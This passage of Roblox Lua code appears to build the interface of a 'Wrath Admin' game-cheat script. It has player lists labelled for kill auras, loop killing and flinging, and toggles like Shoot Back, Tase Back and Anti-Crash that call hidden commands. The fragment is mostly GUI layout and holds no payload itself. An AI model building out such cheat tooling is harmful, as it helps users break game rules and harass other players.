MainGuiObjects.PlayerListFrame.ScrollBarThickness = 1

function ToggleGuis()
    for i,v in pairs(MainGuiObjects.WrathAdminGuiMain:GetChildren()) do
        if v.Name ~= "Commands" and v.Name ~= "Output" then
            v.Visible = not v.Visible;
        end;
    end;
end;

function ToggleCmds()
    MainGuiObjects.Commands.Visible = not MainGuiObjects.Commands.Visible;
end;

function ToggleOutput()
    MainGuiObjects.Output.Visible = not MainGuiObjects.Output.Visible;
end;

local function ShowPlayers(Name, Table)
    for i,v in pairs(MainGuiObjects.PlayerListFrame:GetChildren()) do
        if v:IsA("TextButton") then
            v:Destroy();
        end;
    end;
    if MainGuiObjects.ListTitle.Text == Name then
        MainGuiObjects.PlayerList.Visible = not MainGuiObjects.PlayerList.Visible;
    else
        MainGuiObjects.ListTitle.Text = Name;
        MainGuiObjects.PlayerList.Visible = true;
    end;
    for i,v in next, Table do
        if Players:FindFirstChild(v.Name) then
            local TextButton_10 = Instance.new("TextButton")
            TextButton_10.Parent = MainGuiObjects.PlayerListFrame
            TextButton_10.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
            TextButton_10.BorderColor3 = Color3.fromRGB(27, 42, 53)
            TextButton_10.BorderSizePixel = 0
            TextButton_10.Position = UDim2.new(0, 0, 1.10570937e-07, 0)
            TextButton_10.Size = UDim2.new(0, 167, 0, 25)
            TextButton_10.Font = Enum.Font.Code
            TextButton_10.TextScaled = true;
            if v.DisplayName ~= v.Name then
                TextButton_10.Text = v.Name .. " (" .. v.DisplayName .. ")";
            else
                TextButton_10.Text = v.Name
            end;
            TextButton_10.TextColor3 = Color3.fromRGB(255, 255, 255)
            TextButton_10.TextSize = 14.000
            TextButton_10.MouseButton1Click:Connect(function()
                if CurrentlyViewing and CurrentlyViewing.Player then
                    if CurrentlyViewing.Player.Name == v.Name then
                        UseCommand(Settings.Prefix .. "unview");
                    else
                        UseCommand(Settings.Prefix .. "view " .. v.Name);
                    end;
                else
                    UseCommand(Settings.Prefix .. "view " .. v.Name);
                end;
            end);
            local Corner = Instance.new("UICorner");
            Corner.CornerRadius = UDim.new(0, 5);
            Corner.Parent = TextButton_10;
            MainGuiObjects.PlayerListFrame.CanvasSize = UDim2.new(0, 0, 0, MainGuiObjects.UIListLayout_3.AbsoluteContentSize.Y)
            task.wait(0.03)
        end;
    end;
end;

MainGuiObjects.TextButton.MouseButton1Click:Connect(function()
    local Spammers = {};
    for i,v in pairs(ArmorSpamFlags) do
        if v > 50 then
            local Player = Players:FindFirstChild(i)
            if Player then
                Spammers[#Spammers+1] = Player;
            end;
        end;
    end;
    ShowPlayers("Armor Spammers", Spammers);
end);

MainGuiObjects.TextButton_2.MouseButton1Click:Connect(function()
    ShowPlayers("Admins", Admins);
end);

MainGuiObjects.TextButton_3.MouseButton1Click:Connect(function()
    local Invis = {};
    for _,CHAR in pairs(workspace:GetChildren()) do
        local Player = Players:FindFirstChild(CHAR.Name)
        if Player then
            local Head = CHAR:FindFirstChild("Head")
            if Head then
                if Head.Position.Y > 5000 or Head.Position.X > 99999 then
                    table.insert(Invis, Player);
                end
            end
        end
    end
    ShowPlayers("Invisible", Invis);
end);

MainGuiObjects.TextButton_4.MouseButton1Click:Connect(function()
    ShowPlayers("Kill Auras", KillAuras);
end);

MainGuiObjects.TextButton_5.MouseButton1Click:Connect(function()
    ShowPlayers("Tase Auras", TaseAuras)
end)

MainGuiObjects.TextButton_6.MouseButton1Click:Connect(function()
    ShowPlayers("Loop Killing", Loopkilling);
end);

MainGuiObjects.TextButton_7.MouseButton1Click:Connect(function()
    ShowPlayers("Loop Tasing", LoopTasing);
end);

MainGuiObjects.TextButton_8.MouseButton1Click:Connect(function()
    ShowPlayers("Infected", Infected);
end);

MainGuiObjects.TextButton_9.MouseButton1Click:Connect(function()
    ShowPlayers("Protected", Protected);
end);

MainGuiObjects.GetFlingers.MouseButton1Click:Connect(function()
    local Flingers = {};
    local ValidParts = {}
    for _,CHAR in pairs(workspace:GetChildren()) do
        if Players:FindFirstChild(CHAR.Name) then
            for _,object in pairs(CHAR:GetChildren()) do
                ValidParts[object.Name] = object;
            end
            if not ValidParts["Torso"] and not ValidParts["Head"] then
                local Player = Players:FindFirstChild(CHAR.Name)
                if Player then
                    table.insert(Flingers, Player);
                end;
            end
            ValidParts = {}
        end
    end

    ShowPlayers("Invis Flingers", Flingers);
end);

MainGuiObjects.GetOnePunchers.MouseButton1Click:Connect(function()
    ShowPlayers("One Punch", Onepunch);
end);

MainGuiObjects.GetAntiShoots.MouseButton1Click:Connect(function()
    ShowPlayers("Shoot Back", AntiShoots);
end);

MainGuiObjects.GetClickTeleports.MouseButton1Click:Connect(function()
    ShowPlayers("Click Teleport", ClickTeleports);
end);
MainGuiObjects.GetTaseBack.MouseButton1Click:Connect(function()
    ShowPlayers("Tase Back", TaseBacks);
end);

MainGuiObjects.UIListLayout_3.Parent = MainGuiObjects.PlayerListFrame
MainGuiObjects.UIListLayout_3.HorizontalAlignment = Enum.HorizontalAlignment.Center
MainGuiObjects.UIListLayout_3.SortOrder = Enum.SortOrder.LayoutOrder
MainGuiObjects.UIListLayout_3.Padding = UDim.new(0, 5)

MainGuiObjects.UICorner_13.CornerRadius = UDim.new(0, 5)
MainGuiObjects.UICorner_13.Parent = MainGuiObjects.TextButton_10

MainGuiObjects.PlayerListRound_3.CornerRadius = UDim.new(0, 5)
MainGuiObjects.PlayerListRound_3.Name = "PlayerListRound"
MainGuiObjects.PlayerListRound_3.Parent = MainGuiObjects.PlayerList

MainGuiObjects.Toggles.Name = "Toggles"
MainGuiObjects.Toggles.Parent = MainGuiObjects.WrathAdminGuiMain
MainGuiObjects.Toggles.BackgroundColor3 = Color3.fromRGB(33, 33, 33)
MainGuiObjects.Toggles.BorderSizePixel = 0
MainGuiObjects.Toggles.Position = UDim2.new(0.727664113, -605, 0.0156493802, 479)
MainGuiObjects.Toggles.Size = UDim2.new(0, 242, 0, 237)
makeDraggable(MainGuiObjects.Toggles);

MainGuiObjects.TogglesTopbar.Name = "TogglesTopbar"
MainGuiObjects.TogglesTopbar.Parent = MainGuiObjects.Toggles
MainGuiObjects.TogglesTopbar.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
MainGuiObjects.TogglesTopbar.BorderSizePixel = 0
MainGuiObjects.TogglesTopbar.Size = UDim2.new(0, 242, 0, 31)

MainGuiObjects.TemplateTopbarRound_3.CornerRadius = UDim.new(0, 5)
MainGuiObjects.TemplateTopbarRound_3.Name = "TemplateTopbarRound"
MainGuiObjects.TemplateTopbarRound_3.Parent = MainGuiObjects.TogglesTopbar

MainGuiObjects.TogglesTitle.Name = "TogglesTitle"
MainGuiObjects.TogglesTitle.Parent = MainGuiObjects.TogglesTopbar
MainGuiObjects.TogglesTitle.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
MainGuiObjects.TogglesTitle.BackgroundTransparency = 1.000
MainGuiObjects.TogglesTitle.BorderColor3 = Color3.fromRGB(27, 42, 53)
MainGuiObjects.TogglesTitle.Size = UDim2.new(0, 242, 0, 31)
MainGuiObjects.TogglesTitle.Font = Enum.Font.Code
MainGuiObjects.TogglesTitle.Text = "Toggles"
MainGuiObjects.TogglesTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
MainGuiObjects.TogglesTitle.TextSize = 31.000

MainGuiObjects.PlayerListRound_4.CornerRadius = UDim.new(0, 5)
MainGuiObjects.PlayerListRound_4.Name = "PlayerListRound"
MainGuiObjects.PlayerListRound_4.Parent = MainGuiObjects.Toggles

MainGuiObjects.TogglesListFrame.Name = "TogglesListFrame"
MainGuiObjects.TogglesListFrame.Parent = MainGuiObjects.Toggles
MainGuiObjects.TogglesListFrame.Active = true
MainGuiObjects.TogglesListFrame.BackgroundColor3 = Color3.fromRGB(33, 33, 33)
MainGuiObjects.TogglesListFrame.BorderSizePixel = 0
MainGuiObjects.TogglesListFrame.Position = UDim2.new(0.0371900834, 0, 0.160976171, 0)
MainGuiObjects.TogglesListFrame.Size = UDim2.new(0, 225, 0, 192)
MainGuiObjects.TogglesListFrame.ScrollBarThickness = 1

MainGuiObjects.UIListLayout_4.Parent = MainGuiObjects.TogglesListFrame
MainGuiObjects.UIListLayout_4.SortOrder = Enum.SortOrder.LayoutOrder
MainGuiObjects.UIListLayout_4.Padding = UDim.new(0, 5)

MainGuiObjects.Toggle.Name = "Toggle"
MainGuiObjects.Toggle.Parent = MainGuiObjects.TogglesListFrame
MainGuiObjects.Toggle.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
MainGuiObjects.Toggle.BorderColor3 = Color3.fromRGB(27, 42, 53)
MainGuiObjects.Toggle.BorderSizePixel = 0
MainGuiObjects.Toggle.Position = UDim2.new(0, 0, 2.66529071e-07, 0)
MainGuiObjects.Toggle.Size = UDim2.new(0, 225, 0, 25)
MainGuiObjects.Toggle.Font = Enum.Font.Code
MainGuiObjects.Toggle.Text = " Anti-Crash"
MainGuiObjects.Toggle.TextColor3 = Color3.fromRGB(255, 255, 255)
MainGuiObjects.Toggle.TextSize = 14.000
MainGuiObjects.Toggle.TextXAlignment = Enum.TextXAlignment.Left
MainGuiObjects.Toggle.MouseButton1Click:Connect(function()
    UseCommand(Settings.Prefix .. "acrash");
    ChangeGuiToggle(States.AntiCrash, "Anti-Crash");
    if States.AntiCrash then
        ChangeGuiToggle(false, "Shoot Back");
        ChangeGuiToggle(false, "Tase Back");
    end;
end);

MainGuiObjects.UICorner_14.CornerRadius = UDim.new(0, 5)
MainGuiObjects.UICorner_14.Parent = MainGuiObjects.Toggle

MainGuiObjects.TextLabel_4.Parent = MainGuiObjects.Toggle
MainGuiObjects.TextLabel_4.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
MainGuiObjects.TextLabel_4.BackgroundTransparency = 1.000
MainGuiObjects.TextLabel_4.Position = UDim2.new(0.800000012, 0, 0, 0)
MainGuiObjects.TextLabel_4.Size = UDim2.new(0, 45, 0, 25)
MainGuiObjects.TextLabel_4.Font = Enum.Font.Code
MainGuiObjects.TextLabel_4.Text = "true"
MainGuiObjects.TextLabel_4.TextColor3 = Color3.fromRGB(85, 255, 0)
MainGuiObjects.TextLabel_4.TextSize = 14.000

MainGuiObjects.Toggle_2.Name = "Toggle"
MainGuiObjects.Toggle_2.Parent = MainGuiObjects.TogglesListFrame
MainGuiObjects.Toggle_2.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
MainGuiObjects.Toggle_2.BorderColor3 = Color3.fromRGB(27, 42, 53)
MainGuiObjects.Toggle_2.BorderSizePixel = 0
MainGuiObjects.Toggle_2.Position = UDim2.new(0, 0, 2.66529071e-07, 0)
MainGuiObjects.Toggle_2.Size = UDim2.new(0, 225, 0, 25)
MainGuiObjects.Toggle_2.Font = Enum.Font.Code
MainGuiObjects.Toggle_2.Text = " Anti-Bring"
MainGuiObjects.Toggle_2.TextColor3 = Color3.fromRGB(255, 255, 255)
MainGuiObjects.Toggle_2.TextSize = 14.000
MainGuiObjects.Toggle_2.TextXAlignment = Enum.TextXAlignment.Left
MainGuiObjects.Toggle_2.MouseButton1Click:Connect(function()
    UseCommand(Settings.Prefix .. "ab");
    ChangeGuiToggle(States.AntiBring, "Anti-Bring");
end);

MainGuiObjects.UICorner_15.CornerRadius = UDim.new(0, 5)
MainGuiObjects.UICorner_15.Parent = MainGuiObjects.Toggle_2

MainGuiObjects.TextLabel_5.Parent = MainGuiObjects.Toggle_2
MainGuiObjects.TextLabel_5.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
MainGuiObjects.TextLabel_5.BackgroundTransparency = 1.000
MainGuiObjects.TextLabel_5.Position = UDim2.new(0.800000012, 0, 0, 0)
MainGuiObjects.TextLabel_5.Size = UDim2.new(0, 45, 0, 25)
MainGuiObjects.TextLabel_5.Font = Enum.Font.Code
MainGuiObjects.TextLabel_5.Text = "false"
MainGuiObjects.TextLabel_5.TextColor3 = Color3.fromRGB(255, 0, 0)
MainGuiObjects.TextLabel_5.TextSize = 14.000

MainGuiObjects.Toggle_3.Name = "Toggle"
MainGuiObjects.Toggle_3.Parent = MainGuiObjects.TogglesListFrame
MainGuiObjects.Toggle_3.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
MainGuiObjects.Toggle_3.BorderColor3 = Color3.fromRGB(27, 42, 53)
MainGuiObjects.Toggle_3.BorderSizePixel = 0
MainGuiObjects.Toggle_3.Position = UDim2.new(0, 0, 2.66529071e-07, 0)
MainGuiObjects.Toggle_3.Size = UDim2.new(0, 225, 0, 25)
MainGuiObjects.Toggle_3.Font = Enum.Font.Code
MainGuiObjects.Toggle_3.Text = " Shoot Back"
MainGuiObjects.Toggle_3.TextColor3 = Color3.fromRGB(255, 255, 255)
MainGuiObjects.Toggle_3.TextSize = 14.000
MainGuiObjects.Toggle_3.TextXAlignment = Enum.TextXAlignment.Left
MainGuiObjects.Toggle_3.MouseButton1Click:Connect(function()
    UseCommand(Settings.Prefix .. "sb");
    ChangeGuiToggle(States.ShootBack, "Shoot Back");
end);

MainGuiObjects.TextLabel_6.Parent = MainGuiObjects.Toggle_3
MainGuiObjects.TextLabel_6.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
MainGuiObjects.TextLabel_6.BackgroundTransparency = 1.000
MainGuiObjects.TextLabel_6.Position = UDim2.new(0.800000012, 0, 0, 0)
MainGuiObjects.TextLabel_6.Size = UDim2.new(0, 45, 0, 25)
MainGuiObjects.TextLabel_6.Font = Enum.Font.Code
MainGuiObjects.TextLabel_6.Text = "false"
MainGuiObjects.TextLabel_6.TextColor3 = Color3.fromRGB(255, 0, 0)
MainGuiObjects.TextLabel_6.TextSize = 14.000

MainGuiObjects.UICorner_16.CornerRadius = UDim.new(0, 5)
MainGuiObjects.UICorner_16.Parent = MainGuiObjects.Toggle_3

MainGuiObjects.TaseBackToggle = Instance.new("TextButton");
MainGuiObjects.TaseBackToggle.Name = "Toggle"
MainGuiObjects.TaseBackToggle.Parent = MainGuiObjects.TogglesListFrame
MainGuiObjects.TaseBackToggle.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
MainGuiObjects.TaseBackToggle.BorderColor3 = Color3.fromRGB(27, 42, 53)
MainGuiObjects.TaseBackToggle.BorderSizePixel = 0
MainGuiObjects.TaseBackToggle.Position = UDim2.new(0, 0, 2.66529071e-07, 0)
MainGuiObjects.TaseBackToggle.Size = UDim2.new(0, 225, 0, 25)
MainGuiObjects.TaseBackToggle.Font = Enum.Font.Code
MainGuiObjects.TaseBackToggle.Text = " Tase Back"
MainGuiObjects.TaseBackToggle.TextColor3 = Color3.fromRGB(255, 255, 255)
MainGuiObjects.TaseBackToggle.TextSize = 14.000
MainGuiObjects.TaseBackToggle.TextXAlignment = Enum.TextXAlignment.Left
MainGuiObjects.TaseBackToggle.MouseButton1Click:Connect(function()
    UseCommand(Settings.Prefix .. "tb");
    ChangeGuiToggle(States.TaseBack, "Tase Back");
end);

MainGuiObjects.UICorner_16.CornerRadius = UDim.new(0, 5);
MainGuiObjects.UICorner_16.Parent = MainGuiObjects.TaseBackToggle

MainGuiObjects.TBTextToggle = Instance.new("TextLabel")
MainGuiObjects.TBTextToggle.Parent = MainGuiObjects.TaseBackToggle
MainGuiObjects.TBTextToggle.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
MainGuiObjects.TBTextToggle.BackgroundTransparency = 1.000
MainGuiObjects.TBTextToggle.Position = UDim2.new(0.800000012, 0, 0, 0)
MainGuiObjects.TBTextToggle.Size = UDim2.new(0, 45, 0, 25)
MainGuiObjects.TBTextToggle.Font = Enum.Font.Code
MainGuiObjects.TBTextToggle.Text = "false"
MainGuiObjects.TBTextToggle.TextColor3 = Color3.fromRGB(255, 0, 0)
MainGuiObjects.TBTextToggle.TextSize = 14.000

MainGuiObjects.Toggle_4.Name = "Toggle"
MainGuiObjects.Toggle_4.Parent = MainGuiObjects.TogglesListFrame
MainGuiObjects.Toggle_4.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
MainGuiObjects.Toggle_4.BorderColor3 = Color3.fromRGB(27, 42, 53)
MainGuiObjects.Toggle_4.BorderSizePixel = 0
MainGuiObjects.Toggle_4.Position = UDim2.new(0, 0, 2.66529071e-07, 0)
MainGuiObjects.Toggle_4.Size = UDim2.new(0, 225, 0, 25)
MainGuiObjects.Toggle_4.Font = Enum.Font.Code
MainGuiObjects.Toggle_4.Text = " Anti-Fling"
MainGuiObjects.Toggle_4.TextColor3 = Color3.fromRGB(255, 255, 255)
MainGuiObjects.Toggle_4.TextSize = 14.000
MainGuiObjects.Toggle_4.TextXAlignment = Enum.TextXAlignment.Left
MainGuiObjects.Toggle_4.MouseButton1Click:Connect(function()
    UseCommand(Settings.Prefix .. "afling");
    ChangeGuiToggle(States.AntiFling, "Anti-Fling");
end);

MainGuiObjects.UICorner_17.CornerRadius = UDim.new(0, 5)
MainGuiObjects.UICorner_17.Parent = MainGuiObjects.Toggle_4

MainGuiObjects.TextLabel_7.Parent = MainGuiObjects.Toggle_4
MainGuiObjects.TextLabel_7.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
MainGuiObjects.TextLabel_7.BackgroundTransparency = 1.000
MainGuiObjects.TextLabel_7.Position = UDim2.new(0.800000012, 0, 0, 0)
MainGuiObjects.TextLabel_7.Size = UDim2.new(0, 45, 0, 25)
MainGuiObjects.TextLabel_7.Font = Enum.Font.Code
MainGuiObjects.TextLabel_7.Text = "false"
MainGuiObjects.TextLabel_7.TextColor3 = Color3.fromRGB(255, 0, 0)
MainGuiObjects.TextLabel_7.TextSize = 14.000

MainGuiObjects.Toggle_5.Name = "Toggle"
MainGuiObjects.Toggle_5.Parent = MainGuiObjects.TogglesListFrame
MainGuiObjects.Toggle_5.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
MainGuiObjects.Toggle_5.BorderColor3 = Color3.fromRGB(27, 42, 53)
MainGuiObjects.Toggle_5.BorderSizePixel = 0
MainGuiObjects.Toggle_5.Position = UDim2.new(0, 0, 2.66529071e-07, 0)
MainGuiObjects.Toggle_5.Size = UDim2.new(0, 225, 0, 25)
MainGuiObjects.Toggle_5.Font = Enum.Font.Code
MainGuiObjects.Toggle_5.Text = " Anti-Punch"
MainGuiObjects.Toggle_5.TextColor3 = Color3.fromRGB(255, 255, 255)
MainGuiObjects.Toggle_5.TextSize = 14.000
MainGuiObjects.Toggle_5.TextXAlignment = Enum.TextXAlignment.Left
MainGuiObjects.Toggle_5.MouseButton1Click:Connect(function()
    UseCommand(Settings.Prefix .. "ap");
    ChangeGuiToggle(States.AntiPunch, "Anti-Punch");
end);

MainGuiObjects.UICorner_18.CornerRadius = UDim.new(0, 5)
MainGuiObjects.UICorner_18.Parent = MainGuiObjects.Toggle_5

MainGuiObjects.TextLabel_8.Parent = MainGuiObjects.Toggle_5
MainGuiObjects.TextLabel_8.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
MainGuiObjects.TextLabel_8.BackgroundTransparency = 1.000
MainGuiObjects.TextLabel_8.Position = UDim2.new(0.800000012, 0, 0, 0)
MainGuiObjects.TextLabel_8.Size = UDim2.new(0, 45, 0, 25)
MainGuiObjects.TextLabel_8.Font = Enum.Font.Code
MainGuiObjects.TextLabel_8.Text = "false"
MainGuiObjects.TextLabel_8.TextColor3 = Color3.fromRGB(255, 0, 0)
MainGuiObjects.TextLabel_8.TextSize = 14.000

MainGuiObjects.Toggle_6.Name = "Toggle"
MainGuiObjects.Toggle_6.Parent = MainGuiObjects.TogglesListFrame
MainGuiObjects.Toggle_6.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
MainGuiObjects.Toggle_6.BorderColor3 = Color3.fromRGB(27, 42, 53)
MainGuiObjects.Toggle_6.BorderSizePixel = 0
MainGuiObjects.Toggle_6.Position = UDim2.new(0, 0, 2.66529071e-07, 0)
MainGuiObjects.Toggle_6.Size = UDim2.new(0, 225, 0, 25)
MainGuiObjects.Toggle_6.Font = Enum.Font.Code
MainGuiObjects.Toggle_6.Text = " Anti-Criminal"
MainGuiObjects.Toggle_6.TextColor3 = Color3.fromRGB(255, 255, 255)
MainGuiObjects.Toggle_6.TextSize = 14.000
MainGuiObjects.Toggle_6.TextXAlignment = Enum.TextXAlignment.Left
MainGuiObjects.Toggle_6.MouseButton1Click:Connect(function()
    UseCommand(Settings.Prefix .. "ac");
    ChangeGuiToggle(States.AntiCriminal, "Anti-Criminal");
end);

-- last minute too
MainGuiObjects.AutoRespawn = Instance.new("TextButton")
MainGuiObjects.AutoRespawn.Name = "Toggle"
MainGuiObjects.AutoRespawn.Parent = MainGuiObjects.TogglesListFrame
MainGuiObjects.AutoRespawn.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
MainGuiObjects.AutoRespawn.BorderColor3 = Color3.fromRGB(27, 42, 53)
MainGuiObjects.AutoRespawn.BorderSizePixel = 0
MainGuiObjects.AutoRespawn.Position = UDim2.new(0, 0, 2.66529071e-07, 0)
MainGuiObjects.AutoRespawn.Size = UDim2.new(0, 225, 0, 25)
MainGuiObjects.AutoRespawn.Font = Enum.Font.Code
MainGuiObjects.AutoRespawn.Text = " Auto-Respawn"
MainGuiObjects.AutoRespawn.TextColor3 = Color3.fromRGB(255, 255, 255)
MainGuiObjects.AutoRespawn.TextSize = 14.000
MainGuiObjects.AutoRespawn.TextXAlignment = Enum.TextXAlignment.Left
MainGuiObjects.AutoRespawn.MouseButton1Click:Connect(function()
    UseCommand(Settings.Prefix .. "auto");
    ChangeGuiToggle(States.AutoRespawn, "Auto-Respawn");
end);

MainGuiObjects.AutoRespawnToggle = Instance.new("TextLabel");
MainGuiObjects.AutoRespawnToggle.Parent = MainGuiObjects.AutoRespawn
MainGuiObjects.AutoRespawnToggle.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
MainGuiObjects.AutoRespawnToggle.BackgroundTransparency = 1.000
MainGuiObjects.AutoRespawnToggle.Position = UDim2.new(0.800000012, 0, 0, 0)
MainGuiObjects.AutoRespawnToggle.Size = UDim2.new(0, 45, 0, 25)
MainGuiObjects.AutoRespawnToggle.Font = Enum.Font.Code
MainGuiObjects.AutoRespawnToggle.Text = "false"
MainGuiObjects.AutoRespawnToggle.TextColor3 = Color3.fromRGB(255, 0, 0)
MainGuiObjects.AutoRespawnToggle.TextSize = 14.000

MainGuiObjects.ARRound = Instance.new("UICorner")
MainGuiObjects.ARRound.CornerRadius = UDim.new(0, 5)
MainGuiObjects.ARRound.Parent = MainGuiObjects.AutoRespawn

MainGuiObjects.AutoTeamChange = Instance.new("TextButton")
MainGuiObjects.AutoTeamChange.Name = "Toggle"
MainGuiObjects.AutoTeamChange.Parent = MainGuiObjects.TogglesListFrame
MainGuiObjects.AutoTeamChange.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
MainGuiObjects.AutoTeamChange.BorderColor3 = Color3.fromRGB(27, 42, 53)
MainGuiObjects.AutoTeamChange.BorderSizePixel = 0
MainGuiObjects.AutoTeamChange.Position = UDim2.new(0, 0, 2.66529071e-07, 0)
MainGuiObjects.AutoTeamChange.Size = UDim2.new(0, 225, 0, 25)
MainGuiObjects.AutoTeamChange.Font = Enum.Font.Code
MainGuiObjects.AutoTeamChange.Text = " Auto Team Change"
MainGuiObjects.AutoTeamChange.TextColor3 = Color3.fromRGB(255, 255, 255)
MainGuiObjects.AutoTeamChange.TextSize = 14.000
MainGuiObjects.AutoTeamChange.TextXAlignment = Enum.TextXAlignment.Left
MainGuiObjects.AutoTeamChange.MouseButton1Click:Connect(function()
    UseCommand(Settings.Prefix .. "atc");
    ChangeGuiToggle(States.AutoTeamChange, "Auto Team Change");
end);

MainGuiObjects.ATCToggle = Instance.new("TextLabel");
MainGuiObjects.ATCToggle.Parent = MainGuiObjects.AutoTeamChange
MainGuiObjects.ATCToggle.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
MainGuiObjects.ATCToggle.BackgroundTransparency = 1.000
MainGuiObjects.ATCToggle.Position = UDim2.new(0.800000012, 0, 0, 0)
MainGuiObjects.ATCToggle.Size = UDim2.new(0, 45, 0, 25)
MainGuiObjects.ATCToggle.Font = Enum.Font.Code
MainGuiObjects.ATCToggle.Text = "true"
MainGuiObjects.ATCToggle.TextColor3 = Color3.fromRGB(85, 255, 0)
MainGuiObjects.ATCToggle.TextSize = 14.000

MainGuiObjects.ATCRound = Instance.new("UICorner")
MainGuiObjects.ATCRound.CornerRadius = UDim.new(0, 5)
MainGuiObjects.ATCRound.Parent = MainGuiObjects.AutoTeamChange

function ChangeGuiToggle(State, Name)
    for i,v in pairs(MainGuiObjects.TogglesListFrame:GetChildren()) do
        if v:IsA("TextButton") then
            if v.Text == " " .. Name then
                if State then
                    v:FindFirstChildWhichIsA("TextLabel").Text = "true";
                    v:FindFirstChildWhichIsA("TextLabel").TextColor3 = Color3.fromRGB(85, 255, 0)
                else
                    v:FindFirstChildWhichIsA("TextLabel").Text = "false";
                    v:FindFirstChildWhichIsA("TextLabel").TextColor3 = Color3.fromRGB(255, 0, 0);
                end;
            end;
        end;
    end;
end;

function ChangeImmunityToggle(State, Name)
    for i,v in pairs(MainGuiObjects.ImmunityListFrame:GetChildren()) do
        if v:IsA("TextButton") then
            if v.Text == " " .. Name then
                if State then
                    v:FindFirstChildWhichIsA("TextLabel").Text = "true";
                    v:FindFirstChildWhichIsA("TextLabel").TextColor3 = Color3.fromRGB(85, 255, 0)
                else
                    v:FindFirstChildWhichIsA("TextLabel").Text = "false";
                    v:FindFirstChildWhichIsA("TextLabel").TextColor3 = Color3.fromRGB(255, 0, 0);
                end;
            end;
        end;
    end;
end;

MainGuiObjects.UICorner_19.CornerRadius = UDim.new(0, 5)
MainGuiObjects.UICorner_19.Parent = MainGuiObjects.Toggle_6

MainGuiObjects.TextLabel_9.Parent = MainGuiObjects.Toggle_6
MainGuiObjects.TextLabel_9.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
MainGuiObjects.TextLabel_9.BackgroundTransparency = 1.000
MainGuiObjects.TextLabel_9.Position = UDim2.new(0.800000012, 0, 0, 0)
MainGuiObjects.TextLabel_9.Size = UDim2.new(0, 45, 0, 25)
MainGuiObjects.TextLabel_9.Font = Enum.Font.Code
MainGuiObjects.TextLabel_9.Text = "false"
MainGuiObjects.TextLabel_9.TextColor3 = Color3.fromRGB(255, 0, 0)
MainGuiObjects.TextLabel_9.TextSize = 14.000

MainGuiObjects.ImmunitySettings.Name = "ImmunitySettings"
MainGuiObjects.ImmunitySettings.Parent = MainGuiObjects.WrathAdminGuiMain
MainGuiObjects.ImmunitySettings.BackgroundColor3 = Color3.fromRGB(33, 33, 33)
MainGuiObjects.ImmunitySettings.BorderSizePixel = 0
MainGuiObjects.ImmunitySettings.Position = UDim2.new(0.727664113, -354, 0.402190834, -235)
MainGuiObjects.ImmunitySettings.Size = UDim2.new(0, 242, 0, 241)
makeDraggable(MainGuiObjects.ImmunitySettings);

MainGuiObjects.ImmunityTopbar.Name = "ImmunityTopbar"
MainGuiObjects.ImmunityTopbar.Parent = MainGuiObjects.ImmunitySettings
MainGuiObjects.ImmunityTopbar.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
MainGuiObjects.ImmunityTopbar.BorderSizePixel = 0
MainGuiObjects.ImmunityTopbar.Size = UDim2.new(0, 242, 0, 31)

MainGuiObjects.TemplateTopbarRound_4.CornerRadius = UDim.new(0, 5)
MainGuiObjects.TemplateTopbarRound_4.Name = "TemplateTopbarRound"
MainGuiObjects.TemplateTopbarRound_4.Parent = MainGuiObjects.ImmunityTopbar

MainGuiObjects.TogglesTitle_2.Name = "TogglesTitle"
MainGuiObjects.TogglesTitle_2.Parent = MainGuiObjects.ImmunityTopbar
MainGuiObjects.TogglesTitle_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
MainGuiObjects.TogglesTitle_2.BackgroundTransparency = 1.000
MainGuiObjects.TogglesTitle_2.BorderColor3 = Color3.fromRGB(27, 42, 53)
MainGuiObjects.TogglesTitle_2.Size = UDim2.new(0, 242, 0, 31)
MainGuiObjects.TogglesTitle_2.Font = Enum.Font.Code
MainGuiObjects.TogglesTitle_2.Text = "Immunity Settings"
MainGuiObjects.TogglesTitle_2.TextColor3 = Color3.fromRGB(255, 255, 255)
MainGuiObjects.TogglesTitle_2.TextSize = 24.000

MainGuiObjects.PlayerListRound_5.CornerRadius = UDim.new(0, 5)
MainGuiObjects.PlayerListRound_5.Name = "PlayerListRound"
MainGuiObjects.PlayerListRound_5.Parent = MainGuiObjects.ImmunitySettings

MainGuiObjects.ImmunityListFrame.Name = "ImmunityListFrame"
MainGuiObjects.ImmunityListFrame.Parent = MainGuiObjects.ImmunitySettings
MainGuiObjects.ImmunityListFrame.Active = true
MainGuiObjects.ImmunityListFrame.BackgroundColor3 = Color3.fromRGB(33, 33, 33)
MainGuiObjects.ImmunityListFrame.BorderSizePixel = 0
MainGuiObjects.ImmunityListFrame.Position = UDim2.new(0.0371900834, 0, 0.164775416, 0)
MainGuiObjects.ImmunityListFrame.Size = UDim2.new(0, 225, 0, 192)
MainGuiObjects.ImmunityListFrame.ScrollBarThickness = 1

MainGuiObjects.UIListLayout_5.Parent = MainGuiObjects.ImmunityListFrame
MainGuiObjects.UIListLayout_5.SortOrder = Enum.SortOrder.LayoutOrder
MainGuiObjects.UIListLayout_5.Padding = UDim.new(0, 5)

MainGuiObjects.Toggle_7.Name = "Toggle"
MainGuiObjects.Toggle_7.Parent = MainGuiObjects.ImmunityListFrame
MainGuiObjects.Toggle_7.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
MainGuiObjects.Toggle_7.BorderColor3 = Color3.fromRGB(27, 42, 53)
MainGuiObjects.Toggle_7.BorderSizePixel = 0
MainGuiObjects.Toggle_7.Position = UDim2.new(0, 0, 2.66529071e-07, 0)
